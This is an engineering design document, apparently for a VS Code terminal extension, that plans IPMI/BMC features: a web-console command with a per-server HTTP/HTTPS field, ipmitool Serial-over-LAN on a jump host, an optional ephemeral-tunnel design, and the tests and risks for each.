- **Sibling: `nexus.server.openBmcWebConsole` — "Open BMC Web Console"** (also PR-B, since Ogun named plain-browser as sufficient, Q5): `vscode.env.openExternal` to `<scheme>://<ipmiHost>`, bracketing IPv6 literals, reusing the same refusals. A genuine one-liner over machinery PR-B already builds, and it retires the web-console need without PR-D. **No auto-login** — the owner explicitly does not want it, and it is manufacturer-specific.
- **The scheme is a per-server setting, not a hard-coded `https://` (rev11: PR #57 review r8, finding 3).** Plenty of older iDRAC/iLO/IPMI cards serve their UI on plain HTTP — §4.2 Path A says so in its own port reasoning — and hard-coding `https` leaves those users with **no workaround at all** on this command, unlike the browser *macro*, whose URL they can simply edit. New optional field:

  ```ts
  // ServerConfig, beside ipmiHost / ipmiAuthProfileId / ipmiGatewayServerId
  /** Scheme for "Open BMC Web Console". ABSENT MEANS "https" — the safe
   *  default, and what every record written before this field existed
   *  implies. Never written by inventory sync. */
  bmcWebProtocol?: "https" | "http";
  ```

  Advanced form select next to the other IPMI fields, default *HTTPS*, with the hint: *"Some older BMCs only serve their web interface over plain HTTP. HTTP sends your BMC login in clear text over the management network — use it only where the BMC offers nothing else."*
  - **Why a stored field rather than the alternatives.** A per-invocation QuickPick ("https or http?") puts a prompt on **every** use of a one-click command, to re-answer a fact about the hardware that never changes — friction proportional to usage for information that is static. Falling back to "use a browser macro instead" reintroduces the picker this command exists to skip, i.e. it answers the request by withdrawing the feature. Probing the BMC (try HTTPS, fall back on failure) means firing a request at a management controller from the extension host and guessing from a timeout — slow, unreliable against a device that may simply be off, and it would have to happen before every launch. A one-line optional field is the smallest thing that stays out of the way once set.
  - **The scheme is NOT smuggled into `ipmiHost`, and cannot be.** Phase 1's address rule is a positive charset with no `/` and no scheme concept (`ADDRESS_CHARSET = /^[A-Za-z0-9._\-:]+$/`, `profileTokens.ts:160`) — `https://10.0.0.5` fails it outright, deliberately, because `ipmiHost` is substituted into shell command lines where a scheme is meaningless and `/` is not a character that field should ever carry. Keeping the scheme in its own typed, two-valued field is the only shape that does not weaken that rule.
  - **Bookkeeping bill is the standard one and PR-B already touches all three sites:** `serverConfigsEqual` + `mergeServerConfigFields` (`config.ts:207-227`, `:252-280`), the tolerant type check in `validateServerConfig` (anything outside the two literals reads as absent ⇒ `https`, the untrusted-field discipline). **Sync never writes it** — no stamp, no matrix row, no interaction with Phase 2 at all. Backup/share carry it as an ordinary scalar; there is nothing to remap and nothing sensitive in it.
- **When PR-C lands**, `connectBmcSol` honors `ipmiGatewayServerId` the same way a `route: "ipmiGateway"` macro does: deliver into the gateway session with the `-a` form (env injection cannot cross to a remote shell, §4.2 Path B item 2). No flag question arises — the command's own routing follows the target server's field, because unlike a macro the command has no independent identity to carry an opt-in on, and choosing it against a gateway-configured server is an unambiguous request to reach *that* server's BMC by whatever route is configured for it.
- **Tests:** full config → `createTerminal` receives the env pair, `sendText` carries the expected `-E sol activate` line, and **no macro picker is shown** (fails against an implementation that just opens the picker pre-filtered); missing `ipmiHost` → typed refusal + Edit Server action, no terminal spawned; profile linked but no stored password → prompt invoked, answer lands in env, cancel spawns nothing; password appears in no `sendText` payload (the §3.5 invariant, re-asserted on this path because it is a second call site for the same secret); with `ipmiGatewayServerId` set (post-PR-C) → gateway session + `-a`, never a local terminal. **Web-console protocol (rev11):** server with no `bmcWebProtocol` → `openExternal` receives `https://<ipmiHost>`; `bmcWebProtocol: "http"` → `http://<ipmiHost>`; a garbage stored value (`"HTTPS"`, `"ftp"`, a non-string) → **https**, not a thrown error or a literal-scheme URL (*kills a direct interpolation of the stored value into the URL, which would let an imported record choose the scheme string*); IPv6 `ipmiHost` → authority bracketed under both schemes.

**Size:** medium PR — model (`ServerConfig.ipmiAuthProfileId` + `ServerConfig.bmcWebProtocol` + `TerminalMacro.provideIpmiCredentials`) + validation + sweep + token + flag-gated env pathway + server-form select + macro-editor checkbox + templates (SOL + power, §3.3) + **the two direct-connect commands (§3.6)** + docs. Independent of Phase 2 (touches disjoint code except `ServerConfig`), so either order merges cleanly.

### 4.1 Honest technical assessment first: the UDP problem

- IPMI lanplus (RMCP+) — the transport of the shipped SOL template — is **UDP port 623**. SOL payloads ride the same UDP session.
- Everything NexTerminal can forward is TCP: `TunnelManager`'s local mode is a TCP listener (`net.createServer`, `tunnelManager.ts:179`) piping into an SSH `direct-tcpip` channel (`openDirectTcp`, `:241`; contract at `src/services/ssh/contracts.ts:39`); reverse mode is `tcpip-forward` (`:294-347`); dynamic mode is SOCKS5 **CONNECT only** (`src/services/tunnel/socks5.ts:123` rejects every other command — no UDP ASSOCIATE). The SSH protocol itself has no UDP channel type. **Therefore: local `ipmitool -I lanplus` through any NexTerminal tunnel is impossible, full stop.** This must be stated on issue #48 rather than designed around quietly.
- Non-options, examined and rejected:
  - **SOCKS5 UDP ASSOCIATE**: not implementable over an SSH backhaul (same UDP-over-SSH wall).
  - **sshuttle/TUN-style VPN**: needs root + external tooling on both ends; far outside an extension's remit.
  - **UDP relay via `socat` on the jump host** (UDP↔TCP bridge into a tunnel): requires provisioning tooling on the bastion, breaks RMCP+ timing/retransmit assumptions, and is exactly the kind of half-working footgun the charset-not-quoting philosophy in this codebase argues against.
- What **does** work:
  - **TCP management planes through a tunnel**: BMC web console (HTTPS/443) and Redfish API (HTTPS/443) tunnel perfectly.
  - **Running ipmitool where UDP reachability already exists** — i.e., on the jump host itself, inside an SSH session NexTerminal already knows how to open (independent of any session to the *managed* server, satisfying Ogun's independence requirement).

### 4.2 Recommended architecture

**New field (lands in PR-C — rev9):** `ServerConfig.ipmiGatewayServerId?: string` — "reach this server's BMC via that server" (an id reference into the same server list, like `SshJumpProxy.jumpHostId`, `config.ts:15-18`). It is shared by both paths below, and it ships with **Path B / PR-C** because jump-host execution cannot work without it; Path A / PR-D then *consumes* an existing field rather than introducing one. The dependency runs one way — **PR-D depends on PR-C, never the reverse** — so PR-C remains buildable and shippable whether or not PR-D is ever gated in. Advanced form select next to `ipmiHost`/`ipmiAuthProfileId`; unset = BMC is reachable locally (today's behavior, unchanged). **Setting it changes nothing on its own (rev2: PR #57 review finding 2):** it declares *which* box to use when something asks for gateway routing — the ephemeral web-console tunnel (Path A) and macros that opt in via `route: "ipmiGateway"` (Path B item 0). It is a topology fact about the server, never a mode the server is in.

**Bookkeeping the field owes, share export included (rev4: PR #57 review r3, finding 2).** Beyond the usual `serverConfigsEqual`/`mergeServerConfigFields`/`validateServerConfig` entries, `ipmiGatewayServerId` is an **id reference into the server list**, which makes it share-export material: `sanitizeForSharing` randomizes every server id (`configCommands.ts:701-704`) and remaps the references it knows about — `proxy.jumpHostId` through `remapProxy` (`:671-685`), `tunnel.defaultServerId` (`:729-735`) — while the server spread carries anything else through verbatim. An exported `ipmiGatewayServerId` would therefore name a server id that does not exist in the receiving installation. It remaps through **the same `idMap` as `proxy.jumpHostId`**, and takes `remapProxy`'s disposition for the out-of-export case: when the gateway server is not part of the bundle the field is **dropped to `undefined`**, not carried stale. Dropping is the right failure here and not merely the consistent one — an unset gateway means "the BMC is reachable locally", which is a safe, working default on the recipient's machine, whereas a stale id is a reference that can only produce a confusing failure at run time. (PR-C scope, since PR-C creates the field.)

*Why not reuse `server.proxy` implicitly:* the SSH proxy chain describes how to reach the server's **SSH port**; the BMC network is frequently reachable only from a *different* bastion (or from the bastion but not from the final hop). Guessing would route traffic through the wrong box silently. The form can **pre-fill** the select from `proxy.jumpHostId` when it is an SSH jump — a suggestion, not an inference. (This also answers the assessment's old `$PROXY$` question: the jump host for IPMI is its own explicit field, not a token.)

**Path A — web console via ephemeral tunnel (PR-D — NOT PLANNED as of rev10; retained as reference design).** *(rev10: issue #48 owner feedback — open question 5 was answered "no": a browser pointed at the BMC address is sufficient. Everything below is a reviewed design kept for a future ask, including the rev2 scheme-port and rev6 authority-parsing corrections; nothing here is scheduled. The plain-browser need it was competing with is met by §3.6's `openBmcWebConsole`.)* *(rev9: PR #57 review r7 — this path was labelled "PR-C1" in the body while the section header and the PR table already had it demoted to the optional PR-D. The label is corrected here because it materially changes what a mandatory PR contains: an implementer following body labels would have built the gated tunnel as part of PR-C.)*
1. `browserTarget` (`serverMacroCommands.ts:157-193`) grows a routing step: after `resolveMacroBrowserUrl` validates the URL, if the URL's host matches the server's configured BMC host (normalization below) **and** `ipmiGatewayServerId` is set, establish an ephemeral local tunnel — `127.0.0.1:<os-assigned> → SSH(gateway) → <bmcHost>:<remotePort>` — then rewrite only the URL authority to `127.0.0.1:<port>` and open that.

   **The configured `ipmiHost` is an AUTHORITY, not a bare host, and must be parsed before either use (rev6: PR #57 review r4, finding 2).** `ipmiHost` legitimately carries an optional port under the shipped PR #55 address rules: the unbracketed charset admits `:` (`ADDRESS_CHARSET = /^[A-Za-z0-9._\-:]+$/`, `profileTokens.ts:160`) so `10.0.0.5:8443` and `bmc.example.com:8443` are valid values, and the bracketed IPv6 form parses an explicit optional port group of its own (`BRACKETED_ADDRESS = /^\[([^\[\]]+)\](?::([0-9]{1,5}))?$/`, `:199`). A raw `url.hostname === server.ipmiHost` comparison therefore fails **precisely in the explicit-port case** — `hostname` never carries a port — so gateway tunneling would be silently skipped for exactly the BMCs on a non-standard port, the ones most likely to need it; and feeding the raw field to the tunnel would pass `"10.0.0.5:8443"` as a *hostname*.
   - **Parse** the configured value into `(bmcHost, configuredPort?)` using the same structural forms the address validator already defines: bracketed → `BRACKETED_ADDRESS` groups 1 and 2; unbracketed → a trailing `:<digits>` is a port **only when the value contains exactly one colon**, because two or more colons mean an unbracketed IPv6 literal (`fe80::1` is a host, not `fe80:` on port 1) — the same reason URL authorities require brackets for IPv6-with-port. Factor it beside `isAddressValue` (`profileTokens.ts:251-257`) so the parse and the validation cannot disagree about what a legal value looks like.
   - **Compare** `url.hostname` against `bmcHost`, case-insensitively, with brackets stripped from **both** sides — WHATWG `URL.hostname` returns IPv6 hosts bracketed (`[fe80::1]`), which is why the original "bracketed-IPv6 normalized" note has to apply to the URL side too, not only the config side.
   - **Tunnel remote host is `bmcHost`** — the parsed host, never the raw field, and unbracketed, since the SSH `direct-tcpip` channel takes a host string (`openDirectTcp`, `tunnelManager.ts:241`).
   - **Remote port precedence, stated once:** the resolved URL's **explicit port** if it has one, otherwise the **scheme default** — 80 for `http:`, 443 for `https:` (rev2: PR #57 review finding 3; the first draft's flat `?? 443` silently tunnelled `http://bmc/` to the BMC's TLS port, which either fails to connect or serves the wrong service, and does so *after* the browser has already been pointed at the local port). The configured port does **not** appear in this list, and deliberately so: the shipped template builds the URL by substituting the token (`https://${profile.ipmiHost}/`), so an `ipmiHost` of `10.0.0.5:8443` *arrives as the URL's own port* and is already covered by the first rule. The configured port is a **parse-time concern only** — it exists to be stripped off the host before comparison. Where the two could differ (a hand-written `browserUrl` naming the BMC without a port while `ipmiHost` carries one), the URL wins, because the URL is what the user asked the browser to open. BMC web UIs on plain HTTP are common on older iDRAC/iLO/IPMI cards, so the scheme-default arm is the normal case, not an edge case; an unrecognized scheme is refused with the existing URL-validation error rather than defaulted. Doing the rewrite on the **parsed resolved URL** (not in the token pass) keeps `profileTokens.ts` routing-agnostic and its authority machinery (`:585-707`) untouched.
2. Tunnel mechanics: reuse `TunnelManager.start` (`tunnelManager.ts:81-121`) with a synthetic in-memory `TunnelProfile` (`config.ts:282-298`) — `connectionMode: "shared"` so auth/2FA happens once up front (the eager-connect pattern `tunnelCommands.ts:155-183` already uses). Two small manager changes are required: **(i)** support `localPort: 0` by reading back `listenerServer.address().port` into `activeTunnel.localPort` after `listen` (`:191` passes the profile port straight through today; reverse mode already has the read-back precedent with `allocatedPort`, `:320-328`); **(ii)** an `ephemeral` marker on `ActiveTunnel` so the Port Forwarding tree can render a transient "IPMI console → <server>" row with the existing stop action instead of looking up a stored profile. Lifecycle v1: the tunnel stays up (BMC consoles open websockets/KVM streams; killing it on page-load would break them), listed in the tree, stopped manually or on window close — `autoStop`-style idle reaping is v1.1.
3. The gateway hop composes with existing proxy chains for free: the ephemeral tunnel's SSH connection to the gateway goes through `ProxySshFactory` like any other connect, so a gateway that itself sits behind a jump chain works (`src/services/ssh/proxySshFactory.ts:75-117`, circular-chain guard at `:217-239`).
4. **Zero-code fallback that exists today** and should be documented regardless: a persistent `TunnelProfile` (localPort → BMC:443, default server = bastion, `browserUrl` set — `src/utils/tunnelProfile.ts:4-18`) already delivers web-console-via-jump-host by hand. The ephemeral path is the fleet-scale version of it, not new capability.

**Path B — SOL by running ipmitool on the jump host (PR-C — the primary Phase-4 deliverable; relabelled from "PR-C2" in rev9). (rev2: PR #57 review finding 2 — routing is now a per-macro opt-in, not a server-level side effect.)**

0. **The routing gate.** The first draft routed *every* `localTerminal` macro of a server that has `ipmiGatewayServerId` set into the gateway session. **Withdrawn:** `runIn: "localTerminal"` is a promise about *where the command runs* — a user's `ping`, `scp`, `nmap`, `code`, or any local helper macro would, on the mere presence of an unrelated server-level field, start executing on the bastion instead. That is a silent change of execution host for commands that were never about IPMI, with real consequences (commands that don't exist on the bastion, credentials/paths that only exist locally, and audit trails that now show the bastion running a user's local tooling). A server-level field must not redefine a macro-level contract.

   **Revised: `TerminalMacro` gains a routing option**, sibling to the credentials flag of §3.3:

   ```ts
   /** Where a `runIn: "localTerminal"` macro's terminal actually lives.
    *  "local" (the default, and the meaning of ABSENT) = this machine, today's
    *  behavior. "ipmiGateway" = the target server's IPMI gateway session, when
    *  one is configured. Meaningless for other run targets. UNTRUSTED at every
    *  read site like `runIn`: resolve through a helper that maps anything
    *  outside the union to "local". */
   route?: "local" | "ipmiGateway";
   ```

   Behavior, stated exhaustively:
   - `route` absent / `"local"` → **always a local terminal**, regardless of `ipmiGatewayServerId`. This is every macro that exists today and every macro anyone writes without thinking about IPMI.
   - `route: "ipmiGateway"` **and** the target server has `ipmiGatewayServerId` → gateway session delivery (steps 1–3 below).
   - `route: "ipmiGateway"` **and no gateway configured on the target** → **runs locally**, plus a delivery note (`serverMacroCommands.ts:211-219`): *"No IPMI gateway is configured for <server> — running locally."* Chosen over warning-and-refusing because §4.2's own semantics already say *unset gateway = the BMC is reachable locally*; local is the intended destination for that server, not a degradation, and refusing would make one shipped template unusable on the majority of servers that need no bastion. The note keeps it non-silent, which is the only property the alternative bought.
   - Editor surface: a **"Run on"** select next to "Run in", shown only when Run in = *Local terminal* — via the macro editor's own conditional-visibility pattern, not `visibleWhen` (**rev5: main re-validation** — that panel is bespoke, see §3.4; mirror the "Run in" custom-select at `macroEditorHtml.ts:143-155`/`:318-330` and the `style.display` toggle at `:472`), options *`This machine`* / *`The server's IPMI gateway (falls back to this machine)`*, hint: *"IPMI gateway routing runs the command in an SSH session on the gateway server configured for the target server, so tools like ipmitool can reach a BMC network that isn't reachable from here. Tokens are still resolved against the target server."*
   - Old-build behavior is the safe one by construction: a build that doesn't know `route` runs the macro locally (its only behavior), which is exactly the `route: "local"` semantics — no silent divergence, unlike the withdrawn design (see risk 4).
   - **Imported macros arrive local-routed, and the user re-consents once (rev11: PR #57 review r8, finding 1).** `route` is in `IMPORTED_CAPABILITY_FIELDS` (§3.3), so a shared or restored macro that its author had set to `ipmiGateway` **imports as local** — the same rule, and for the same reason, as the credentials flag: the importing user's bastion is not the exporting user's, and executing someone else's command there must be an act, not an inheritance. The flow is therefore *strip → run locally → user re-ticks "Run on" if they want it*, and the design owes the user a pointer at the moment it matters rather than a silent behavior change:
     - The **restore/import notice** (§3.3) already names both capabilities — *"Capability settings on imported macros (IPMI credentials, gateway routing) were reset; re-enable them on the macros you trust."* Verified in rev11 to cover `route`, not just credentials; it is the one-time, bulk-scoped half of the message.
     - The **per-run delivery note** gains a `route` twin of §3.3's credentials hint, scoped exactly as narrowly: when a `localTerminal` macro whose text uses `ipmiHost`/`ipmiUsername` runs against a server that **has** `ipmiGatewayServerId` set while the macro is local-routed, append — *"This macro runs on this machine. If this BMC is only reachable from `<gateway>`, set 'Run on: the server's IPMI gateway' in the macro editor."* The IPMI-token condition is what keeps it from nagging on every unrelated local helper on a gateway server, exactly as the credentials hint is gated (r1's "token usage keeps its hint role while losing its authorization role"). It fires for a stripped import, for a hand-written macro that forgot the select, and for nothing else.

1. For a `localTerminal` macro run with `route: "ipmiGateway"` where the target server has `ipmiGatewayServerId` set, the run uses "on <gateway>" instead of a local terminal: resolve tokens against the **target** server exactly as today (chokepoint unchanged — the same charset that protects a local shell protects the remote one, `profileTokens.ts:448-480` explicitly reasons about the union of shells), then deliver the text into a **session terminal of the gateway server**, reusing `resolveServerSessionTarget` + `connectAndAwaitSessionTerminal` verbatim (`serverMacroCommands.ts:260-349` — the connect-first confirmation, the connect-failed vs timeout split, the pinned-target discipline all carry over by pointing them at the gateway's `ServerConfig`). SOL is interactive and needs a real PTY, which is why this rides a session terminal rather than `SshConnection.exec()` (`contracts.ts:41`, `ssh2Connector.ts:116-126` — no pty option, and a raw exec stream has no terminal UI anyway).
2. **Credentials on the remote hop — the honest limitation:** Phase 3's env injection cannot reach a remote shell (`createTerminal({env})` is local; SSH `SendEnv` is server-policy-gated), and sending `export IPMI_PASSWORD=…` as text would land the secret in remote history, scrollback, and `TerminalCaptureBuffer` — categorically out. v1 uses **`ipmitool -a`** (ipmitool prompts for the password itself on the remote tty, no echo, nothing stored): the jump-host template variant is ` ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -a sol activate\n`, shipped with **`route: "ipmiGateway"`** already set and the credentials flag off (item 4's table). A later refinement can type the stored password programmatically when the `Password:` prompt is observed (the `SessionPtyHandle.writeProgrammatic` + output-observer machinery the script runtime already has), but that is a deliberate scope cut for v1 — it needs the same care as script `expect` and shouldn't gate the feature.
3. Requires ipmitool installed on the bastion — a documentation fact, plus a decent error surface (the command's own `command not found` in the visible terminal is honest enough for v1).
4. **Shipped templates after PR-C, and how the two flags combine (rev2).** The two per-macro opt-ins added by this review — `provideIpmiCredentials` (§3.3) and `route` (above) — are siblings in the macro editor and are *not* redundant: one grants a secret, the other chooses an execution host, and §4.2 item 2 above is precisely the reason they cannot be collapsed into a single "this is an IPMI macro" switch.

   | `route` | `provideIpmiCredentials` | result |
   |---|---|---|
   | `local` (default) | off | plain local terminal — today's behavior, and every pre-existing macro |
   | `local` | on | local terminal with `IPMITOOL_PASSWORD`/`IPMI_PASSWORD` in its env → the `-E` form works (§3.3). **This is the Phase-3 shipped "IPMI SOL" template** |
   | `ipmiGateway` (gateway set) | off | text delivered into a gateway session; ipmitool's own `-a` prompt supplies the password on the bastion tty. **This is the PR-C shipped "IPMI SOL (via jump host)" template** — IPMI-specific by nature, so it ships with `route: "ipmiGateway"` set |
   | `ipmiGateway` (gateway set) | on | **credentials flag is inert** — env injection cannot cross to a remote shell (item 2). The macro still runs on the gateway; the editor shows a non-blocking hint on this combination (*"IPMI credentials can't be sent to a gateway session — ipmitool will prompt on the gateway instead"*) and the run emits the same note. Deliberately not an error: a user may flip `route` back and forth on one macro, and silently dropping the flag would be worse than explaining it |
   | `ipmiGateway` (no gateway on target) | either | runs locally per the fall-back rule above; the credentials flag then applies normally, because the terminal really is local |

   Consequence for the shipped set: **two IPMI SOL templates, not one** — the `-E`/local one (PR-B) and the `-a`/gateway one (PR-C). That is the honest shape given item 2's limitation, and each carries exactly the flags its own command needs.

**Ranking of alternatives** (for the issue write-up): (1) Path B (PR-C) as the recommended build, with Path A (PR-D) alongside it only if the web console is wanted — rev9, the earlier "Paths A+B — recommended" predates the owner correction that made A optional; (2) persistent tunnel profiles per BMC — works today, tedious at fleet scale, remains the documented manual fallback; (3) Redfish-through-tunnel CLI tooling — real but a different feature (future); (4) SOCKS/dynamic for the browser — `vscode.env.openExternal` cannot set a browser proxy, rejected; (5) any UDP relay scheme — rejected per §4.1.

### 4.3 Phase 4 tests (rev2: PR #57 review — routing-opt-in and scheme-port items added; **split by PR in rev9**)

**Which PR owns which item (rev9: PR #57 review r7):** the items below cover both paths, and after the PR-C/PR-D relabel above they must not be read as one test suite. **PR-C (Path B)** owns the routing items — gateway session routing, unrelated-macros-stay-local, the routing fall-back, untrusted `route`, and the share-export gateway remap. **PR-D (Path A)** owns the tunnel items — URL rewrite, scheme-derived port, configured-authority parsing, port read-back, and the ephemeral-tunnel integration tests. Stated explicitly because the tunnel items need `test/integration/` machinery (real TCP sockets) that PR-C has no reason to stand up. **(rev10: with PR-D not planned, the PR-D items are unscheduled along with it — they are the test plan a revival would start from, not work anyone owes today. The PR-C items are live and unaffected.)**

- URL rewrite: resolved `https://[fe80::1]/` with gateway set → tunnel target `(fe80::1, 443)`, opened URL authority `127.0.0.1:<port>`, path/query preserved (fails against an implementation that rewrites non-authority occurrences of the host — the `?target=` lesson from `profileTokens.ts:519-533`).
- **Scheme-derived tunnel port (rev2, finding 3):** `http://10.0.0.5/` with gateway set → tunnel target port **80**; `https://10.0.0.5/` → **443**; `http://10.0.0.5:8443/` → **8443** (explicit port always wins). The `http:` case fails against the withdrawn flat `?? 443` default — build all three in one table-driven fixture so the defaulting rule is observable, not incidental.
- **Configured authority is parsed, not compared raw (rev6: PR #57 review r4, finding 2):** `ipmiHost = "10.0.0.5:8443"` with the shipped template (`https://${profile.ipmiHost}/` → resolved `https://10.0.0.5:8443/`) → the host comparison **matches** and the tunnel targets **(`10.0.0.5`, 8443)**. *Fails twice against raw-field equality: the comparison misses (so no tunnel is established at all and the browser is pointed at an unreachable BMC), and a naive fix that passes the field through as the remote host dials the literal hostname `"10.0.0.5:8443"`.* Siblings, all in one table: bracketed IPv6 with a port — `ipmiHost = "[fe80::1]:8443"`, resolved `https://[fe80::1]:8443/` → matches, targets (`fe80::1`, 8443) with the tunnel host **unbracketed**; **unbracketed IPv6 without a port** — `ipmiHost = "fe80::1"`, resolved `https://[fe80::1]/` → matches (brackets stripped on the URL side, and the multi-colon value is **not** split into host+port — *kills a last-colon split, which would read this as host `fe80:` port `1`*); plain no-port case `10.0.0.5` → unchanged behavior, scheme default; and a **non-match** case (`browserUrl` pointing at an unrelated host while a gateway is configured) → no tunnel, URL opened as-is.
- Port read-back: synthetic profile with `localPort: 0` → `ActiveTunnel.localPort` is the OS-assigned port (fails against the current pass-through).
- Gateway session routing: `localTerminal` macro **with `route: "ipmiGateway"`** + gateway set → text delivered to the gateway's session terminal, never a local terminal, and tokens resolved against the *target* server (fixture where target and gateway have different `ipmiHost` values — fails against resolving on the wrong server).
- **Unrelated local macros stay local (rev2, the finding-2 regression test):** a `localTerminal` macro with **no `route`** (e.g. a plain `ping`/`ssh-copy-id` helper containing no IPMI token), run against a server that **does** have `ipmiGatewayServerId` configured → `vscode.window.createTerminal` is called and **no gateway session is opened or connected**. Fails against the withdrawn "gateway set ⇒ route everything" design, which is exactly the implementation this test exists to prevent. Sibling: `route: "local"` explicitly set on a gateway server → same assertion (fails against an implementation that treats the field as advisory).
- **Routing fall-back:** `route: "ipmiGateway"` on a server with **no** gateway → local terminal **plus** the "no IPMI gateway configured" delivery note (fails both against an implementation that refuses the run and against one that drops the note).
- **Untrusted `route`:** `route: "IPMIGATEWAY"` / `route: 7` from an imported record → resolved to `"local"` (fails against a direct `===`/truthiness read — the `resolveMacroRunTarget` discipline).
- **Route re-consent hint (rev11: PR #57 review r8):** a local-routed `localTerminal` macro whose text uses `${profile.ipmiHost}`, run against a server that **has** `ipmiGatewayServerId` set → the run emits the "set 'Run on: the server's IPMI gateway'" note and still runs locally. Sibling that pins the scoping: a local-routed macro with **no** IPMI token on the same gateway-configured server → **no note** (fails against a hint keyed on the server's gateway alone, which would nag on every unrelated local helper — the noise that would train users to ignore the channel).
- **Gateway id remap on share export (rev4: PR #57 review r3, finding 2):** server A with `ipmiGatewayServerId = B.id`, both exported → in the bundle, A's gateway id is B's **new** id and resolves to B; export A **without** B → A's `ipmiGatewayServerId` is `undefined`, not B's original id. *Fails against the verbatim server spread, which is the current behavior for every field the remap does not name.* **Round-trip sibling — CORRECTED (rev11: PR #57 review r8, finding 1).** The rev4 version said "import the bundle into an empty installation and assert a `route: \"ipmiGateway\"` macro on A actually finds a gateway". **That assertion can never pass, and it contradicts this design's own security rule:** `IMPORTED_CAPABILITY_FIELDS` (§3.3, rev4) deletes `route` on every import path, so the imported macro is local-routed by construction. Worse, the obvious way to make it green — exempting `route` from the strip — is precisely the unconsented-bastion execution r3 closed. The test splits into two, which is also the honest description of what is being verified:
  1. **Data assertion, no macro involved:** after importing the bundle, the imported **server** record's `ipmiGatewayServerId` resolves to the imported B. This is the remap's actual claim, and it is testable directly on the record — the macro was never the right vehicle for it.
  2. **Behavioral assertion, after an explicit re-consent step:** import, then **locally set `route: "ipmiGateway"` on the imported macro** (the test standing in for the importing user re-ticking "Run on" in the editor), *then* assert gateway delivery against the imported A/B pair. **The re-enable step is not test scaffolding to be optimized away — it is the test modeling the intended UX**, and a reviewer who deletes it as "an extra step" has deleted the property under test. Note in the fixture why it is there.

  Together they still cover the two-field interaction the rev4 item was reaching for (a remapped route with a dangling gateway would fall back to local execution and look like it worked) — item 1 catches the dangling reference, item 2 catches the delivery.
- Ephemeral tunnels use real TCP sockets in `test/integration/` per the existing TunnelManager convention (CLAUDE.md).

**Risks**
1. **Stamp-semantics divergence** — `syncedIpmiHost` deliberately does *not* copy `host`/`port` ownership; the matrix in §2.3 is the spec, and the update-path comment block must say so or the next reader "fixes" it into device-always-wins. (This codebase's `syncedUsername` history is the cautionary tale — `config.ts:43-61`.)
2. **Env-var trust surface (rev2: PR #57 review)** — injecting the credential into a shell the user then owns is by design (auditability posture), and the gate is now an **explicit per-macro `provideIpmiCredentials` flag**, not the withdrawn "macro text mentions an IPMI token" heuristic (§3.3). The residual risk is that the flag be read truthily, defaulted to true anywhere, bypassed by the prompt fallback, **or arrive already set from an import** — all four are covered by the §3.5 fixtures, and the review's own case (an imported `curl`/`ping` macro carrying `${profile.ipmiHost}` to harvest the fleet-wide BMC password) is the named regression test. **The import vector is the one that makes this a standing bill rather than a one-time fix (rev4: PR #57 review r3):** `sanitizeImportedMacro` persists any field it was not explicitly taught to remove, so *every future capability flag inherits the vulnerability by default* unless it is added to `IMPORTED_CAPABILITY_FIELDS` (§3.3). Treat that list as part of the definition of "adding a capability flag", not as a follow-up. What remains accepted: a flagged macro's terminal is a shell the user owns, and anything run in it can read the variable — that is the deliberate trade, now bounded by consent that cannot be imported.
3. **Ephemeral-tunnel UI wiring** — `TunnelTreeProvider`/registry sync assume stored profiles; the `ephemeral` marker needs a deliberate render path or the tree shows orphaned rows. Flagged as the main unknown in **PR-D** (rev9 — the risk belongs to the ephemeral-tunnel work, not to PR-C; nothing in PR-C creates an ephemeral tunnel); investigate `tunnelRegistrySync.ts` interaction before committing to the synthetic-profile shape. **Dormant as of rev10** — PR-D is not planned, so this risk is carried, not run: it becomes live again only if PR-D is revived, and it is the first thing to re-examine then.
4. **Old-build skew (downgrade / backup round-trip through an old build; NOT Settings Sync — globalState is per-machine, no `setKeysForSync` in `src/`)** — `${profile.ipmiUsername}` on old builds degrades to a visible "sent as-is" note (good); a `-E` template on old builds fails with ipmitool's own error (acceptable, document); an unknown `provideIpmiCredentials`/`route` is simply not read, so an old build runs the macro locally with no credential in the environment — **strictly the safe direction in both cases** (rev2: the withdrawn server-level routing design was the *silently different* behavior this risk used to name; per-macro opt-ins remove it, because "old build ignores the flag" and "flag is off" are the same behavior).
5. **BMC TLS quirks through the tunnel** — cert CN mismatch on `127.0.0.1` is a browser warning users of self-signed BMC certs already see; some BMCs redirect to their absolute IP (breaks the tunnel illusion) — known limitation to document, not solvable client-side. **Dormant as of rev10** (PR-D not planned). Note the direct-browser path §3.6 ships instead has *neither* problem: it opens the BMC's own address, so certificates match whatever the BMC presents and an absolute-IP redirect is a no-op — one of the quiet reasons the requester's "just open a browser" answer is a good one.
